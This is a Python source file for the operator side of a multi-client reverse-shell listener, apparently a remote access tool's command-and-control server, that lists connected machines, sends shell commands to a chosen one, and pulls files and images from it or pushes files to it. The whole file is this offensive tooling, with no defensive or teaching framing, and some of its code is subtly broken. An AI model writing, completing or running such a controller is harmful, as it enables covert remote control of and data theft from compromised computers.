import socket
import os, sys, select, time

host = 'localhost'  # input("host:")
port = 5005  # input("port:")
clear = lambda: os.system('cls')
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind((host, port))
c.listen(100)
active = False
clients = []
socks = []
interval = 0.8

while True:
    try:
        c.settimeout(4)
        try:
            s, a = c.accept()
        except socket.timeout:
            continue
        if (a):
            s.settimeout(None)
            socks += [s]
            clients += [str(a)]
        clear()
        print('\nlistening for clients....\n')
        if len(clients) > 0:
            for j in range(0, len(clients)):
                print('[' + str((j + 1)) + ']client:' + clients[j] + '\n')
            print('press ctrl+C to interact with clinet.')
        time.sleep(interval)
    except KeyboardInterrupt:
        clear()
        print('\nlistening for clients....\n')
        if len(clients) > 0:
            for j in range(0, len(clients)):
                print('[' + str((j + 1)) + ']client:' + clients[j] + '\n')
            print("...\n")
            print("[0] Exit \n")
        activate = int(input('\nEnter option.\n'))
        # if activate == 0:
        #     print('\nExiting....\n')
        #     sys.exit()
        activate -= 1
        clear()
        print('activing clinet.' + clients[activate] + '\n')
        active = True
        print(socks)
        print(socks[activate])
        socks[activate].send(b'dir')
    while active:
        data = socks[activate].recv(5000).decode("utf-8")
        print(data)
        if data.startswith('Exit') == True:
            active = False
            print('press ctrl+c to return to listener mode....')
        else:
            nextcmd = input('shell$ ')
            socks[activate].send(nextcmd.encode('utf-8'))
        if nextcmd.startswith("download") == True:

            downFile = nextcmd[9:]
            try:
                f = open(downFile, 'wb')
                print('downloading file', downFile)
                while True:
                    l = socks[activate].recv(5000)
                    while 1:
                        if l.endswith('EOFEOFX'):
                            u = l[:-7]
                            f.write(u)
                            s.send("cls")
                            print("file downloaded")
                            break
                        elif l.startswith('EOFEOFX'):
                            break
                        else:
                            f.write(l)
                            l = socks[activate].recv(5000)
                    break
                f.close()
            except:
                pass
            # dir change function
        elif nextcmd.startswith("cd") == True:
            path = nextcmd[3:]

        # upload function
        elif nextcmd.startswith("pic") == True:
            jgp = nextcmd[4:]
            downFile = nextcmd[4:]
            time.sleep(2)
            try:
                f = open(downFile, 'wb')
                print('downloading file', downFile)
                while True:
                    l = socks[activate].recv(512)
                    while 1:
                        if l.endswith('EOFEOFX'):
                            u = l[:-7]
                            f.write(u)
                            s.send("cls")
                            print("file downloaded")
                            break
                        elif l.startswith('EOFEOFX'):
                            break
                        else:
                            f.write(l)
                            l = socks[activate].recv(5000)
                    break
                f.close()
            except:
                pass
        elif nextcmd.startswith("del") == True:
            file = nextcmd[4:]
        elif len(nextcmd) == 0:
            socks[activate].send('dir')

        elif data.startswith('invalid') == True:
            print("invalid filename")
        # upload system
        elif nextcmd.startswith('upload') == True:
            sendFile = nextcmd[7:]
            time.sleep(.8)
            if os.path.isfile(sendFile):
                with open(sendFile, 'rb')as f:
                    while 1:
                        filedata = f.read()
                        if filedata == '': break
                        socks[activate].sendall(filedata)
                f.close()
                time.sleep(0.8)
                socks[activate].sendall('EOFEOFX')
            else:
                print("Faild invalid file")
                socks[activate].send('EOFEOFX')
                pass
